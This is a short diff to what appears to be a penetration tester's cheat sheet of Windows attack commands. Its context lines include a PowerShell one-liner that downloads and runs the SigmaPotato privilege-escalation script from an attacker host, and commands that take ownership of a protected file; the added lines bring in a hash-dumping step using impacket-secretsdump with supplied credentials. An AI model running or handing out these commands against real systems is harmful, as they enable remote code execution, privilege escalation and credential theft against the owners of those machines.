@@ -1009,6 +1009,11 @@ Windows 10 Pro          {3c6859ce-230b-48a4-be6c-932c0c202048}     TrustedInstal
 
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/Invoke-SigmaPotato.ps1');Invoke-SigmaPotato -Command \"whoami /user /priv\""
 
++---------- Dump Hashes ----------+
+powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
+impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
+
+
 +---------- File Permissions ----------+
 powershell -c "(Get-Acl 'C:\secret.txt').Access | Format-Table"
 takeown /f "C:\secret.txt" && icacls "C:\secret.txt" /grant %USERNAME%:F /inheritance:e
